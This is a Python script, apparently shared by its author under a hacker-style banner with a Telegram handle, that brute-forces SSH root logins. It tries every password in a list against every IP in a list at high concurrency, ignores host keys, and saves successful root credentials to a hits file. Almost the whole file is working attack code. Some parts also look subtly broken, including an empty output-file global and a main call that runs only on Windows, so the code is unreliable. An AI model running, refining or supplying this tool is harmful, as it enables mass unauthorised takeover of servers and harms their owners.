import asyncio
import asyncssh
import sys
import time
import os
from pathlib import Path

BANNER = """
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║      ███████╗███████╗██╗  ██╗     ██████╗██████╗  █████╗  ██████╗██╗  ██╗
║      ██╔════╝██╔════╝██║  ██║    ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝
║      ███████╗███████╗███████║    ██║     ██████╔╝███████║██║     █████╔╝ 
║      ╚════██║╚════██║██╔══██║    ██║     ██╔══██╗██╔══██║██║     ██╔═██╗ 
║      ███████║███████║██║  ██║    ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗
║      ╚══════╝╚══════╝╚═╝  ╚═╝     ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
║                                                                      ║
║                    ⚡  SSH Root Brute Forcer ⚡                      ║
║                                                                      ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║                      👤 Coded by: @S1A7ASH                           ║
║                      📺 Telegram: @BlackCat_TM                       ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝

"""
print(BANNER)
class UltraFastSSH:
    def __init__(self, max_concurrent, timeout):
        self.semaphore = asyncio.Semaphore(max_concurrent)
        self.tested = 0
        self.found = 0
        self.start_time = None
        self.lock = asyncio.Lock()
        self.timeout = timeout
        self.max_concurrent = max_concurrent
        
    def load_file(self, filename):
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip() and not line.startswith('#')]
    
    def parse_target(self, item):
        if ':' in item:
            parts = item.split(':')
            ip = parts[0]
            try:
                port = int(parts[1])
            except:
                port = 22
            return ip, port
        return item, 22
    
    async def test_ip(self, ip, port, password):
        async with self.semaphore:
            try:
                conn = await asyncio.wait_for(
                    asyncssh.connect(
                        ip, port=port,
                        username='root',
                        password=password,
                        known_hosts=None
                    ),
                    timeout=self.timeout
                )
                
                conn.close()
                await conn.wait_closed()
                
                async with self.lock:
                    self.found += 1
                    result = f"{ip}:{port} | root:{password}"
                    print(f"\n✅ {result}")
                    
                    with open(OUTPUT_FILE, 'a') as f:
                        f.write(result + '\n')
                        
                return True
                
            except:
                async with self.lock:
                    self.tested += 1
                    
                    if self.tested % 50 == 0:
                        elapsed = time.time() - self.start_time
                        rate = self.tested / elapsed if elapsed > 0 else 0
                        print(f"\r🔍 Tested: {self.tested} | Rate: {rate:.0f}/s | Found: {self.found}", 
                              end='', flush=True)
                return False
    
    async def run(self, ip_file, pass_file, output_file):
        print("="*60)
        print("🚀 SSH Root Checker")
        print("="*60)
        
        try:
            ips_raw = self.load_file(ip_file)
            passwords = self.load_file(pass_file)
        except FileNotFoundError as e:
            print(f"❌ File not found: {e}")
            return
        
        targets = [self.parse_target(item) for item in ips_raw]
        
        with open(output_file, 'w') as f:
            f.write(f"# SSH Root Hits - {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("#" * 40 + "\n")
        
        total_tests = len(targets) * len(passwords)
        
        print(f"📡 IPs: {len(targets)}")
        print(f"🔑 Passwords: {len(passwords)}")
        print(f"🎯 Total Tests: {total_tests:,}")
        print(f"⚡ Max Concurrent: {self.max_concurrent}")
        print(f"⏱️  Timeout: {self.timeout}s")
        print(f"🖥️  OS: {OS_NAME}")
        print("="*60)
        print("Starting in 1 second...\n")
        await asyncio.sleep(1)
        
        self.start_time = time.time()
        
        tasks = []
        for ip, port in targets:
            for password in passwords:
                task = asyncio.create_task(self.test_ip(ip, port, password))
                tasks.append(task)
        
        await asyncio.gather(*tasks, return_exceptions=True)
        
        elapsed = time.time() - self.start_time
        print(f"\n\n{'='*60}")
        print(f"✅ Done!")
        print(f"⏱️  Time: {elapsed:.1f}s")
        print(f"🔍 Tested: {self.tested:,}")
        print(f"🎯 Found: {self.found}")
        print(f"⚡ Speed: {self.tested/elapsed:.0f} tests/s")
        print(f"💾 Results saved to: {output_file}")
        print(f"{'='*60}")

async def main():
    ip_file = input("IP list file: ").strip()
    pass_file = input("Password list file: ").strip()
    output_file = input("Output file [hits.txt]: ").strip() or "hits.txt"
    
    while True:
        try:
            threads = int(input("Max Threads [200]: ").strip() or "200")
            break
        except ValueError:
            print("❌ Invalid number")
    
    while True:
        try:
            timeout = float(input("Timeout per connection in seconds [3]: ").strip() or "3")
            break
        except ValueError:
            print("❌ Invalid number")
    
    if os.path.exists(output_file):
        choice = input(f"⚠️  {output_file} exists. Delete? (y/n): ")
        if choice.lower() == 'y':
            os.remove(output_file)
    
    tester = UltraFastSSH(max_concurrent=threads, timeout=timeout)
    await tester.run(ip_file, pass_file, output_file)

if __name__ == "__main__":
    try:
        import asyncssh
    except ImportError:
        print("❌ asyncssh not installed")
        print("   pip install asyncssh")
        time.sleep(3)
        sys.exit(1)
    
    OS_NAME = "Windows" if sys.platform == "win32" else "Linux/macOS"
    OUTPUT_FILE = ""
    
if sys.platform == "win32":
    import warnings
    warnings.filterwarnings("ignore", category=DeprecationWarning)
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    
    asyncio.run(main())